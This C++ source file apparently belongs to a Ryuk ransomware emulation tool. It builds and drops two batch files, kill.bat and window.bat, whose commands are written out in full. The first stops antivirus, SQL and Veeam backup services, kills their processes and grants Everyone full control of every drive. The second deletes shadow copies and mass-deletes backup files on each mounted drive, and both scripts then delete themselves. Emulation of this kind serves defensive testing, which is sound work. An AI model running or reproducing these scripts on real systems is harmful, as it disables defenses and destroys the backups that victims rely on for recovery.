#include "bat_actions.h"

namespace ryuk {

    static inline void ReplaceAll(std::wstring& instr, const std::wstring& from, const std::wstring& to)
    {
        SIZE_T start_pos = 0ui64;

        if (from.empty())
            return;

        while ((start_pos = instr.find(from, start_pos)) != std::wstring::npos)
        {
            instr.replace(start_pos, from.length(), to);
            start_pos += to.length();
        }

        return;
    }

    /*
     * Helper function in charge of dropping the Kill BAT file into disk.
    */
    void KillBATOperations(std::vector<std::wstring>* driveLetters)
    {
        HANDLE hFileHandle = INVALID_HANDLE_VALUE;
        std::wstring fileLocation = TEXT("C:\\Users\\Public\\kill.bat");
        std::wstring batFile = TEXT(
            ":: T1489 - Service Stop\r\n"
            ":: T1222.001 - File and Directory Permissions Modification: Windows File and Directory Permissions Modification\r\n"
            ":: T1562.001 - Impair Defenses: Disable or Modify Tools\r\n\r\n"
            ":: From source: https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ \r\n"
            "net stop avpsus /y\r\n"
            "net stop McAfeeDLPAgentService /y\r\n"
            "net stop mfewc /y\r\n"
            "net stop BMR Boot Service /y\r\n"
            "net stop NetBackup BMR MTFTP Service /y\r\n\r\n"
            "sc config SQLTELEMETRY start=disabled\r\n"
            "sc config SQLTELEMETRY$ECWDB2 start=disabled\r\n"
            "sc config SQLWriter start=disabled\r\n"
            "sc config SstpSvc start=disabled\r\n"
            "taskkill /IM mspub.exe /F\r\n"
            "taskkill /IM mydesktopqos.exe /F\r\n"
            "taskkill /IM mydesktopservice.exe /F\r\n\r\n"
            ":: From https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/ \r\n"
            "net stop samss /y\r\n"
            "net stop veeamcatalogsvc /y\r\n"
            "net stop veeamcloudsvc /y\r\n"
            "net stop veeamdeploysvc /y\r\n"
            "net stop samss /y\r\n"
            "net stop veeamcatalogsvc /y\r\n"
            "net stop veeamcloudsvc /y\r\n"
            "net stop veeamdeploysvc /y\r\n"
            "taskkill /IM sqlbrowser.exe /F\r\n"
            "taskkill /IM sqlceip.exe /F\r\n"
            "taskkill /IM sqlservr.exe /F\r\n"
            "taskkill /IM sqlwriter.exe /F\r\n"
            "taskkill /IM veeam.backup.agent.configurationservice.exe /F\r\n"
            "taskkill /IM veeam.backup.brokerservice.exe /F\r\n"
            "taskkill /IM veeam.backup.catalogdataservice.exe /F\r\n"
            "taskkill /IM veeam.backup.cloudservice.exe /F\r\n"
            "taskkill /IM veeam.backup.externalinfrastructure.dbprovider.exe /F\r\n"
            "taskkill /IM veeam.backup.manager.exe /F\r\n"
            "taskkill /IM veeam.backup.mountservice.exe /F\r\n"
            "taskkill /IM veeam.backup.service.exe /F\r\n"
            "taskkill /IM veeam.backup.uiserver.exe /F\r\n"
            "taskkill /IM veeam.backup.wmiserver.exe /F\r\n"
            "taskkill /IM veeamdeploymentsvc.exe /F\r\n"
            "taskkill /IM veeamfilesysvsssvc.exe /F\r\n"
            "taskkill /IM veeam.guest.interaction.proxy.exe /F\r\n"
            "taskkill /IM veeamnfssvc.exe /F\r\n"
            "taskkill /IM veeamtransportsvc.exe /F\r\n"
            ":: taskmgr /4\r\n"
            ":: wmiprvse -Embedding\r\n"
            ":: wmiprvse -secured -Embedding\r\n"
            "icacls \"C:\\*\" /grant Everyone:F /T /C /Q\r\n"
        );

        // Drive letter C will remain hard-coded, but all others will be from what was successfully mounted
        // This way we can dynamically adjust the bat file being dropped.

        for (std::vector<std::wstring>::const_iterator it = driveLetters->cbegin(); it != driveLetters->cend(); ++it)
        {
            std::wstring toReplace1 = TEXT("icacls \"<LETTER>\\*\" /grant Everyone:F /T /C /Q\r\n");

            ryuk::ReplaceAll(toReplace1, TEXT("<LETTER>"), *it);

            batFile.append(toReplace1);
        }

        batFile.append(TEXT("del %0\r\n")); // the last line to append...

        hFileHandle = CreateFile(
            fileLocation.c_str(),
            GENERIC_READ | GENERIC_WRITE,
            0L,
            NULL,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );

        if (hFileHandle != INVALID_HANDLE_VALUE)
        {
            std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
            std::string sNarrowBatFile = converter.to_bytes(batFile);

            if (!WriteFile(hFileHandle, sNarrowBatFile.c_str(), sizeof(char) * sNarrowBatFile.length(), 0L, nullptr))
            {
                CloseHandle(hFileHandle);
                return;
            }

            if (!CloseHandle(hFileHandle))
            {
                _ftprintf_s(stderr, TEXT("Error in CloseHandle hFileHandle...\n"));
                return;
            }

            _ftprintf_s(stdout, TEXT("[T1489, T1222.001, T1562.001] Stopping services, File and Directory Permissions Modification, Impair Defenses disable or modify tools... dropped file 'kill.bat'\n"));
            //HINSTANCE operationResult = ShellExecute(NULL, TEXT("runas"), fileLocation.c_str(), NULL, NULL, SW_SHOWNORMAL);

            // Documentation states that if it returns 32 or less there is an error.
            //if (operationResult <= (HINSTANCE)32)
            //{
            //    _ftprintf_s(stderr, TEXT("Return Code: %p\n"), operationResult);
            //}
        }
    }

    /*
     * Helper function in charge of dropping the Window BAT file into disk.
    */
    void WindowBATOperations(std::vector<std::wstring>* driveLetters)
    {
        HANDLE hFileHandle = INVALID_HANDLE_VALUE;
        std::wstring fileLocation = TEXT("C:\\Users\\Public\\window.bat");
        std::wstring batFile = TEXT(
            ":: T1490 - Inhibit System Recovery\r\n"
            ":: From source: https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ \r\n\r\n"
            "vssadmin Delete Shadows /all /quiet\r\n"
            "vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB\r\n"
            "vssadmin resize shadowstorage /for=C: /on=C: /maxsize=unbounded\r\n"
        );

        // Drive letter C will remain hard-coded, but all others will be from what was successfully mounted
        // This way we can dynamically adjust the bat file being dropped.

        for (std::vector<std::wstring>::const_iterator it = driveLetters->cbegin(); it != driveLetters->cend(); ++it)
        {
            std::wstring toReplace1 = TEXT("vssadmin resize shadowstorage /for=<LETTER> /on=<LETTER> /maxsize=401MB\r\n");
            std::wstring toReplace2 = TEXT("vssadmin resize shadowstorage /for=<LETTER> /on=<LETTER> /maxsize=unbounded\r\n");
            
            ryuk::ReplaceAll(toReplace1, TEXT("<LETTER>"), *it);
            ryuk::ReplaceAll(toReplace2, TEXT("<LETTER>"), *it);

            batFile.append(toReplace1);
            batFile.append(toReplace2);
        }

        batFile.append(TEXT("vssadmin Delete Shadows /all /quiet\r\n"));
        batFile.append(TEXT("del /s /f /q C:\\*.VHD C:\\*.bac C:\\*.bak C:\\*.wbcat C:\\*.bkf C:\\Backup*.* C:\\backup*.* C:\\*.set C:\\*.win C:\\*.dsk\r\n"));

        // Drive letter C will remain hard-coded, but all others will be from what was successfully mounted
        // This way we can dynamically adjust the bat file being dropped.
        for (std::vector<std::wstring>::const_iterator it = driveLetters->cbegin(); it != driveLetters->cend(); ++it)
        {
            std::wstring toReplace1 = TEXT("del /s /f /q <LETTER>\\*.VHD <LETTER>\\*.bac <LETTER>\\*.bak <LETTER>\\*.wbcat <LETTER>\\*.bkf <LETTER>\\Backup*.* <LETTER>\\backup*.* <LETTER>\\*.set <LETTER>\\*.win <LETTER>\\*.dsk\r\n");

            ryuk::ReplaceAll(toReplace1, TEXT("<LETTER>"), *it);

            batFile.append(toReplace1);
        }

        batFile.append(TEXT("del %0\r\n"));

        hFileHandle = CreateFile(
            fileLocation.c_str(),
            GENERIC_READ | GENERIC_WRITE,
            0L,
            NULL,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );

        if (hFileHandle != INVALID_HANDLE_VALUE)
        {
            std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
            std::string sNarrowBatFile = converter.to_bytes(batFile);

            if (!WriteFile(hFileHandle, sNarrowBatFile.c_str(), sizeof(char) * sNarrowBatFile.length(), 0L, nullptr))
            {
                CloseHandle(hFileHandle);
                return;
            }

            if (!CloseHandle(hFileHandle))
            {
                _ftprintf_s(stderr, TEXT("Error in CloseHandle hFileHandle...\n"));
                return;
            }

            _ftprintf_s(stdout, TEXT("[T1490] Inhibit System Recovery... dropping 'window.bat'\n"));
            //HINSTANCE operationResult = ShellExecute(NULL, TEXT("runas"), fileLocation.c_str(), NULL, NULL, SW_SHOWNORMAL);

            // Documentation states that if it returns 32 or less there is an error.
            //if (operationResult <= (HINSTANCE)32)
            //{
            //    _ftprintf_s(stderr, TEXT("Return Code: %p\n"), operationResult);
            //}
        }
    }

} // namespace ryuk
